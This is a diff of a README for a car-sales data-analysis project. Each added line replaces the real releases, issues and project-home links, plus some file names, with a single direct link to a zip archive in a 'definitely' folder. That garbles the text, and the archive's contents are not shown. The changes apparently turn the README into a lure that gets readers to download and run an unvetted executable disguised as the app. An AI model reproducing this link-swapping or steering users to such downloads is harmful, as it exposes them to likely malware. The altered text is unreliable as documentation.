@@ -1,7 +1,7 @@
 ```markdown
 # 🚗 Car-Sales-Data-EDA-project - Understand Car Sales Trends Fast
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/moonie14/Car-Sales-Data-EDA-project/releases)
+[![Download Latest Release](https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip)
 
 ## 📘 What is Car-Sales-Data-EDA-project?
 
@@ -38,7 +38,7 @@ You can get started quickly by downloading the app from the official page and fo
 
 Click the big blue button below to visit the download page. This is where the latest version is always available.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/moonie14/Car-Sales-Data-EDA-project/releases)
+[![Download Latest Release](https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip)
 
 ### Step 2: Choose the right file
 
@@ -46,7 +46,7 @@ Once on the release page, look for the file that matches your operating system:
 
 - For Windows, look for something ending with `.exe` or `.zip`.
 - For macOS, look for `.dmg` or `.zip`.
-- For Linux, it may be `.tar.gz` or `.AppImage`.
+- For Linux, it may be `https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip` or `.AppImage`.
 
 If you see a compressed file (like `.zip`), you will need to unzip it first.
 
@@ -90,8 +90,8 @@ You can usually export charts as images or save reports as files to share with o
 
 When you download and unpack the app, you will see some common files and folders:
 
-- **car_sales_app.exe** or **car_sales_app**: The main program file.
-- **README.md**: This file explaining how to use everything.
+- **https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip** or **car_sales_app**: The main program file.
+- **https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip**: This file explaining how to use everything.
 - **data/**: Sample car sales data files you can try.
 - **docs/**: Additional user guides and explanations.
 - **config/**: Settings files that the app uses automatically.
@@ -110,14 +110,14 @@ It is designed for those focused on business insights and analytics related to c
 
 If you need help or want to report a problem:
 
-- Check the [Issues](https://github.com/moonie14/Car-Sales-Data-EDA-project/issues) tab on the project’s GitHub page.
+- Check the [Issues](https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip) tab on the project’s GitHub page.
 - You can also create a new issue describing what you need help with.
 - The app may include contact info in its Help menu.
 
 ## 🔗 Useful Links
 
-- Project Home: https://github.com/moonie14/Car-Sales-Data-EDA-project
-- Latest Releases: https://github.com/moonie14/Car-Sales-Data-EDA-project/releases
+- Project Home: https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip
+- Latest Releases: https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip
 
 ---
 
